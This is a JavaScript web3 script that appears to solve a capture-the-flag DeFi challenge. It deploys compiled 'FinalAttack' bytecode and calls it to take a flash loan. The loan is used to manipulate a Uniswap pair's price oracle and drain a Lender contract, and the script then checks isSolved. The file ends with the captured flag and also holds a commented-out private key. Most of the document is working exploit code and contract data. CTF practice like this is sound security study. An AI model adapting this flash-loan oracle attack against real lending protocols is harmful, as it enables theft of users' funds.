const compiledFinalAttack = require("./build/contracts/FinalAttack.json");

const Web3 = require('web3')
const rpcURL = "http://35.160.101.66:8545/4539cf65-3b33-4baf-ae26-0ecffadf90ba";
const web3 = new Web3(rpcURL);


const finalAttackAbi = compiledFinalAttack.abi;
const finalAttackBytecode = compiledFinalAttack.bytecode;
// const attackBytecode = "608060405234801561001057600080fd5b50604051610bf7380380610bf783398181016040528101906100329190610217565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555084600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555083600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555082600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050505050506102d7565b600081519050610211816102c0565b92915050565b600080600080600060a0868803121561022f57600080fd5b600061023d88828901610202565b955050602061024e88828901610202565b945050604061025f88828901610202565b935050606061027088828901610202565b925050608061028188828901610202565b9150509295509295909350565b6000610299826102a0565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6102c98161028e565b81146102d457600080fd5b50565b610911806102e66000396000f3fe608060405234801561001057600080fd5b506004361061009e5760003560e01c8063a8aa1b3111610066578063a8aa1b3114610135578063ba0bba4014610153578063bcead63e14610171578063c45a01551461018f578063fc0c546a146101ad5761009e565b80632d0c5300146100a35780633fc8cef3146100c15780634fd9cb81146100df578063722713f7146100fb5780639bda5c6514610119575b600080fd5b6100ab6101cb565b6040516100b89190610691565b60405180910390f35b6100c96101f1565b6040516100d69190610733565b60405180910390f35b6100f960048036038101906100f49190610574565b610209565b005b6101036102d0565b604051610110919061074e565b60405180910390f35b610133600480360381019061012e9190610574565b610374565b005b61013d61045c565b60405161014a91906106c7565b60405180910390f35b61015b610482565b60405161016891906106fd565b60405180910390f35b6101796104a8565b60405161018691906106e2565b60405180910390f35b6101976104ce565b6040516101a491906106ac565b60405180910390f35b6101b56104e6565b6040516101c29190610718565b60405180910390f35b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc281565b73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836040518363ffffffff1660e01b815260040161027a929190610668565b602060405180830381600087803b15801561029457600080fd5b505af11580156102a8573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102cc919061054b565b5050565b600073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161031f919061064d565b60206040518083038186803b15801561033757600080fd5b505afa15801561034b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061036f919061059d565b905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146103cc57600080fd5b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639ab603b9826040518263ffffffff1660e01b8152600401610427919061074e565b600060405180830381600087803b15801561044157600080fd5b505af1158015610455573d6000803e3d6000fd5b5050505050565b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f81565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008151905061051b816108ad565b92915050565b600081359050610530816108c4565b92915050565b600081519050610545816108c4565b92915050565b60006020828403121561055d57600080fd5b600061056b8482850161050c565b91505092915050565b60006020828403121561058657600080fd5b600061059484828501610521565b91505092915050565b6000602082840312156105af57600080fd5b60006105bd84828501610536565b91505092915050565b6105cf81610769565b82525050565b6105de816107b1565b82525050565b6105ed816107d5565b82525050565b6105fc816107f9565b82525050565b61060b8161081d565b82525050565b61061a81610841565b82525050565b61062981610865565b82525050565b61063881610889565b82525050565b610647816107a7565b82525050565b600060208201905061066260008301846105c6565b92915050565b600060408201905061067d60008301856105c6565b61068a602083018461063e565b9392505050565b60006020820190506106a660008301846105d5565b92915050565b60006020820190506106c160008301846105e4565b92915050565b60006020820190506106dc60008301846105f3565b92915050565b60006020820190506106f76000830184610602565b92915050565b60006020820190506107126000830184610611565b92915050565b600060208201905061072d6000830184610620565b92915050565b6000602082019050610748600083018461062f565b92915050565b6000602082019050610763600083018461063e565b92915050565b600061077482610787565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006107bc826107c3565b9050919050565b60006107ce82610787565b9050919050565b60006107e0826107e7565b9050919050565b60006107f282610787565b9050919050565b60006108048261080b565b9050919050565b600061081682610787565b9050919050565b60006108288261082f565b9050919050565b600061083a82610787565b9050919050565b600061084c82610853565b9050919050565b600061085e82610787565b9050919050565b600061087082610877565b9050919050565b600061088282610787565b9050919050565b60006108948261089b565b9050919050565b60006108a682610787565b9050919050565b6108b68161077b565b81146108c157600080fd5b50565b6108cd816107a7565b81146108d857600080fd5b5056fea2646970667358221220a27659c9497289161616caab17c67e7cfbe163601686cb4a3856efbb5aad295764736f6c63430008000033";
// const attackAbi = [{"inputs":[{"internalType":"address","name":"_setup","type":"address"},{"internalType":"address","name":"_token","type":"address"},{"internalType":"address","name":"_pair","type":"address"},{"internalType":"address","name":"_lender","type":"address"},{"internalType":"address","name":"_flashloanPool","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"factory","outputs":[{"internalType":"contract IUniswapV2Factory","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"flashloanPool","outputs":[{"internalType":"contract FlashLoan","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"lender","outputs":[{"internalType":"contract Lender","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pair","outputs":[{"internalType":"contract IUniswapV2Pair","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"receiveFlashLoan","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"setup","outputs":[{"internalType":"contract Setup","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"toFlashLoan","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"token","outputs":[{"internalType":"contract Token","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"weth","outputs":[{"internalType":"contract WETH9","name":"","type":"address"}],"stateMutability":"view","type":"function"}];

const tokenAbi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"dropped","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"who","type":"address"}],"name":"getBalanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
const flashLoanAbi = [{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"flashLoan","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"weth","outputs":[{"internalType":"contract WETH9","name":"","type":"address"}],"stateMutability":"view","type":"function"}];
const setupAbi = [{"inputs":[],"stateMutability":"payable","type":"constructor"},{"inputs":[],"name":"factory","outputs":[{"internalType":"contract IUniswapV2Factory","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"flashloanPool","outputs":[{"internalType":"contract FlashLoan","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"lender","outputs":[{"internalType":"contract Lender","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pair","outputs":[{"internalType":"contract IUniswapV2Pair","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"token","outputs":[{"internalType":"contract Token","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"weth","outputs":[{"internalType":"contract WETH9","name":"","type":"address"}],"stateMutability":"view","type":"function"}];
const lenderAbi = [{"inputs":[{"internalType":"contract IUniswapV2Pair","name":"_pair","type":"address"},{"internalType":"contract ERC20Like","name":"_token","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"borrow","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"debt","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"deposited","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"liquidate","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"pair","outputs":[{"internalType":"contract IUniswapV2Pair","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"rate","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"repay","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"safeDebt","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"token","outputs":[{"internalType":"contract ERC20Like","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"weth","outputs":[{"internalType":"contract WETH9","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
const setupAddress = "0x05F51fc5c5622FDb630e971393f96f3EF8F30C2B";
const setup = new web3.eth.Contract(setupAbi, setupAddress);
// const privateKey = "70a7bd0c0c64ca5b2ca81ae909094543dd66eb4ca0c6b25a5517c561b70ee121";

const weth9Address = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
const wethAbi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"guy","type":"address"},{"name":"wad","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"src","type":"address"},{"name":"dst","type":"address"},{"name":"wad","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"wad","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"dst","type":"address"},{"name":"wad","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":true,"name":"guy","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":true,"name":"dst","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"dst","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Deposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"src","type":"address"},{"indexed":false,"name":"wad","type":"uint256"}],"name":"Withdrawal","type":"event"}];
const weth = new web3.eth.Contract(wethAbi, weth9Address);

const getWethBalance = async (address) => {
    const result = await weth.methods.balanceOf(address).call(); 
  
    return web3.utils.fromWei(result);
}

const main = async () => {
    const accounts = await web3.eth.getAccounts();
    const hackerAddress = accounts[0];

    const tokenAddress = await setup.methods.token().call();
    const pairAddress = await setup.methods.pair().call();
    const flashLoanAddress = await setup.methods.flashloanPool().call();
    const lenderAddress = await setup.methods.lender().call();

    const token = new web3.eth.Contract(tokenAbi, tokenAddress);

    const getTokenBalance = async (address) => {
      const result = await token.methods.getBalanceOf(address).call(); 
    
      return web3.utils.fromWei(result);
    }

    console.log("init");
    let lenderTokenBalance = await getTokenBalance(lenderAddress);
    let lenderWethBalance = await getWethBalance(lenderAddress);
    let pairTokenBalance = await getTokenBalance(pairAddress);
    let pairWethBalance = await getWethBalance(pairAddress);

    console.log("lenderTokenBalance", lenderTokenBalance);
    console.log("lenderWethBalance", lenderWethBalance);
    console.log("pairTokenBalance", pairTokenBalance);
    console.log("pairWethBalance", pairWethBalance);

    
    
    console.log("Attempting to deploy from account ", hackerAddress);
    // const initWeth = web3.utils.toWei('200', 'ether');
    const attack = await new web3.eth.Contract(finalAttackAbi)
      .deploy({data: finalAttackBytecode, arguments: [tokenAddress, pairAddress, lenderAddress, flashLoanAddress]})
      .send({from: hackerAddress, gas: 12000000});

    const attackAddress = attack.options.address;
    console.log("contract deployed to ", attackAddress);

    // const attackAddress = "0x2daf08d0159ED83E5E5fdAd8a7C9b6BB229dB0ac";
    // const deployedAttack = new web3.eth.Contract(finalAttackAbi, attackAddress);

    let attackTokenBalance = await getTokenBalance(attackAddress);
    let attackWethBalance = await getWethBalance(attackAddress);
    console.log("attackTokenBalance", attackTokenBalance);
    console.log("attackWethBalance", attackWethBalance);

    // console.log("Attempting to call function");
    // const success = await attack.methods.isSolved();
    // console.log("called, isSolved? ", success);

    // attack.events.Log(function(error, result){
    //   if(!error)console.log(result);
    // });

    // console.log("test testcall()");
    // await attack.methods.testCall("the value").send({from: hackerAddress});
    // await attack.methods.testCall2().send({from: hackerAddress});
    // const result = await attack.methods.getA().call();
    // console.log("result", result);

    // console.log("test getbalance");
    // const value = await attack.methods.getFlashloanPoolWethBalance().call();
    // console.log("balance = ", value);

    // console.log("Attempting to flashloan");
    // const amount = web3.utils.toWei('130', 'ether');
    // await attack.methods.toFlashLoan(amount).send({from: hackerAddress, gas: 8000000});  // why send?
    // console.log("flashLoan ends");

    // console.log("Attempting to test attack()");
    // await attack.methods.attack().send({from: hackerAddress, gas: 8000000});
    console.log("Attempting to final attack");
    await attack.methods.toFlashLoan().send({from: hackerAddress, gas: 12000000});

    // console.log("Attempting to get Token");
    // await attack.methods.getToken().send({from: hackerAddress, gas: 8000000});
    // attackTokenBalance = await getTokenBalance(attackAddress);
    // attackWethBalance = await getWethBalance(attackAddress);
    // console.log("attackTokenBalance", attackTokenBalance);
    // console.log("attackWethBalance", attackWethBalance);

    // console.log("Attempting to swap weth for token");
    // await attack.methods.swapWethForToken().send({from: hackerAddress, gas: 8000000});
    // attackTokenBalance = await getTokenBalance(attackAddress);
    // attackWethBalance = await getWethBalance(attackAddress);
    // console.log("attackTokenBalance", attackTokenBalance);
    // console.log("attackWethBalance", attackWethBalance);

    // console.log("Attempting to swap token for weth")
    // await attack.methods.swapTokenForWeth().send({from: hackerAddress, gas: 8000000});



    let success = await setup.methods.isSolved().call();
    console.log("isSolved? ", success);

    console.log("final state");
    lenderTokenBalance = await getTokenBalance(lenderAddress);
    lenderWethBalance = await getWethBalance(lenderAddress);
    pairTokenBalance = await getTokenBalance(pairAddress);
    pairWethBalance = await getWethBalance(pairAddress);
    attackTokenBalance = await getTokenBalance(attackAddress);
    attackWethBalance = await getWethBalance(attackAddress);

    console.log("lenderTokenBalance", lenderTokenBalance);
    console.log("lenderWethBalance", lenderWethBalance);
    console.log("pairTokenBalance", pairTokenBalance);
    console.log("pairWethBalance", pairWethBalance);
    console.log("attackTokenBalance", attackTokenBalance);
    console.log("attackWethBalance", attackWethBalance);

    // const routerAddress = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
    // const approved = await token.methods.allowance(attackAddress, routerAddress).call();
    // console.log("approved", approved);
}

main();

// FLAG{WH47_C4N_go_Wr0N6_WH3N_Pr1C3_0raC1e_M337_F1asH10aN}